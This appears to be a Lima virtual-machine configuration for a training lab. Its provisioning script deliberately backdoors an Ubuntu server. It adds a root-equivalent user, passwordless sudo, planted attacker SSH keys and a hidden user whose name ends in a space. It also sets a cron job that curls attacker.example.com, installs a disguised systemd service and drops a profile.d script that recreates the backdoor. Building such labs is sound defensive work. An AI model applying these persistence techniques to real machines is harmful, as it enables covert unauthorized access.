arch: "aarch64"
images:
  - location: "https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64.img"
    arch: "aarch64"
cpus: 2
memory: "2GiB"
disk: "20GiB"

provision:
  - mode: system
    script: |
      #!/bin/bash
      set -eux -o pipefail
      
      hostnamectl set-hostname backdoor-server
      apt-get update
      apt-get install -y openssh-server
      
      LIMA_USER=$(stat -c '%U' /home/*)
      
      # Create a backdoor user with UID 0 (root privileges)
      # This is a classic persistence technique
      useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate
      echo "sysupdate:backdoor123" | chpasswd
      
      # Create another backdoor user with high UID (looks normal)
      useradd -m -s /bin/bash -u 1337 operator
      echo "operator:operator123" | chpasswd
      
      # Give operator sudo access without password
      echo "operator ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/operator
      chmod 440 /etc/sudoers.d/operator
      
      # Add unauthorized SSH keys
      mkdir -p /home/operator/.ssh
      cat > /home/operator/.ssh/authorized_keys << 'SSH_EOF'
      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7HxKj3V8nN9L2mP4wX5Y6zQ8rT9uE1vW2sK4pL7mN8oQ9rT6uV3wX4yZ5aB6cD7eF8gH9iJ0kL1mN2oP3qR4sT5uV6wX7yZ8aB9cD0eF1gH2iJ3kL4mN5oP6qR7sT8uV9wX0yZ1aB2cD3eF4gH5iJ6kL7mN8oP9qR0sT1 attacker@evil.com
      SSH_EOF
      
      chown -R operator:operator /home/operator/.ssh
      chmod 700 /home/operator/.ssh
      chmod 600 /home/operator/.ssh/authorized_keys
      
      # Add backdoor key to root as well
      mkdir -p /root/.ssh
      cat > /root/.ssh/authorized_keys << 'ROOT_SSH_EOF'
      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDm5N6oP7qR8sT9uV0wX1yZ2aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4yZ5aB6cD7eF8gH9iJ0kL1mN2oP3qR4sT5uV6wX7yZ8aB9cD0eF1gH2iJ3kL4mN5oP6qR7sT8uV9wX0yZ1aB2cD3eF4gH5iJ6kL7mN8oP9qR0sT1uV2 root@attacker-box
      SSH_EOF
      
      chmod 700 /root/.ssh
      chmod 600 /root/.ssh/authorized_keys
      
      # Create a hidden user (with a space in the name to make it harder to spot)
      useradd -m -s /bin/bash -u 2048 "admin "
      echo "admin :admin123" | chpasswd
      
      # Add persistence via cron
      echo "*/30 * * * * /usr/bin/curl -s http://attacker.example.com/beacon?host=$(hostname) >/dev/null 2>&1" | crontab -u operator -
      
      # Create a systemd service for persistence
      cat > /etc/systemd/system/system-monitor.service << 'SYSTEMD_EOF'
      [Unit]
      Description=System Monitoring Service
      After=network.target
      
      [Service]
      Type=simple
      User=operator
      ExecStart=/bin/bash -c 'while true; do sleep 3600; done'
      Restart=always
      
      [Install]
      WantedBy=multi-user.target
      SYSTEMD_EOF
      
      systemctl daemon-reload
      systemctl enable system-monitor.service
      systemctl start system-monitor.service
      
      # Add some fake login history
      # Simulate logins from suspicious IPs
      echo "operator pts/0 203.0.113.42 $(date -d '2 days ago' '+%a %b %d %H:%M') - $(date -d '2 days ago' '+%H:%M') (00:15)" >> /var/log/wtmp.fake
      
      # Create a script in profile.d that could recreate backdoor
      cat > /etc/profile.d/system-check.sh << 'PROFILE_EOF'
      # System integrity check
      if ! id sysupdate >/dev/null 2>&1; then
          useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate 2>/dev/null
          echo "sysupdate:backdoor123" | chpasswd 2>/dev/null
      fi
      PROFILE_EOF
      
      chmod +x /etc/profile.d/system-check.sh
      
      echo "Backdoor accounts created - system compromised"

portForwards: []
